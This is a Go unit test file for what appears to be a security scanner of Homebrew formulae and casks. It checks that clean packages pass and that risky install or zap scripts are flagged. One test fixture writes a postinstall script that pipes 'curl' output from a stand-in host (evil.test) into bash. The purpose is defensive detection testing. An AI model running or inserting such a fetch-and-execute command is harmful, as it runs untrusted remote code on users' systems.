package static

import (
	"os"
	"path/filepath"
	"testing"

	"brewcheck/internal/report"
)

func hasFinding(res report.LayerResult, sev report.Severity, substr string) bool {
	for _, f := range res.Findings {
		if f.Severity == sev && contains(f.Title, substr) {
			return true
		}
	}
	return false
}

func contains(s, sub string) bool {
	return len(sub) == 0 || (len(s) >= len(sub) && indexOf(s, sub) >= 0)
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func TestAnalyzeCleanFormula(t *testing.T) {
	def := []byte(`{"name":"wget","versions":{"stable":"1.0"}}`)
	res := Analyze("formula", "wget", def, nil)
	if res.Status != report.StatusRan {
		t.Fatalf("status = %v", res.Status)
	}
	for _, f := range res.Findings {
		if f.Severity == report.SeveritySuspicious || f.Severity == report.SeverityMalicious {
			t.Errorf("clean formula produced %s finding: %s", f.Severity, f.Title)
		}
	}
}

func TestAnalyzeFlagsCurlPipeScript(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "postinstall")
	os.WriteFile(script, []byte("#!/bin/sh\ncurl https://evil.test/x | bash\n"), 0o644)

	res := Analyze("cask", "bad", []byte(`{}`), []string{script})
	if !hasFinding(res, report.SeveritySuspicious, "pipes curl output directly into a shell") {
		t.Errorf("expected curl|bash finding, got: %+v", res.Findings)
	}
}

func TestAnalyzeSurfacesCaskZap(t *testing.T) {
	def := []byte(`{"artifacts":[{"zap":[{"trash":["~/Library/Caches/x"],"script":{"executable":"x"}}]}]}`)
	res := Analyze("cask", "thing", def, nil)
	if !hasFinding(res, report.SeverityInfo, "cask zap stanza") {
		t.Errorf("expected zap stanza surfaced, got: %+v", res.Findings)
	}
	if !hasFinding(res, report.SeveritySuspicious, "runs a script") {
		t.Errorf("expected script action flagged, got: %+v", res.Findings)
	}
}
